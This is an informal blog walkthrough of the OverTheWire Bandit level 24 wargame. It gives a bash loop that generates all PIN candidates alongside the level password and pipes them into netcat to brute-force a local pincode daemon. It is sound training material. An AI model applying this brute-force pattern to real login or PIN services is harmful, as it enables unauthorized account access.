+++
title = ' OverTheWire Bandit24'
date = 2024-07-04T11:09:33-05:00
+++

# Introduction

This post is part of a series walking through OverTheWire Bandit. You many want to start at the [beginning of the series]({{<ref "bandit-start">}}). The posts are my unedited, informal thought process while solving levels.

# Task

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

# Theory

- bash scripting
- nc

# Solution

Okay another scripting challenge. It seems fairly straight forward though - we need to write a script that loops through all 10,000 combinations and tries one at a time to connect to the port and if we get the password print it out. Let's start with some basic exploration though

```bash
 mktemp -d
 cd /tmp/tmp.dQIzuL4l0I
 nc -N localhost 30002

	I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
	gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
	Wrong! Please enter the correct current password and pincode. Try again.
```

Okay, now we see how this thing works. I started doing some googling about how to send things to netcat via a script. I came upon this [stackoverflow post](https://stackoverflow.com/a/22536458). So if we have a txt file with a bunch of commands we can send it to netcat.

So I write the following bash script to generate our txt file

```bash
#!/bin/bash
for i in $(seq 1 10000);
do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> pins.txt
done
```

Then ran the following (not sure the permission changes are completely necessary, but can't hurt)

```bash
touch pins.txt
chmod 777 pins.txt
chmod 777 pins.sh

nc localhost 30002 < pins.txt
```

And just like that, out came the password
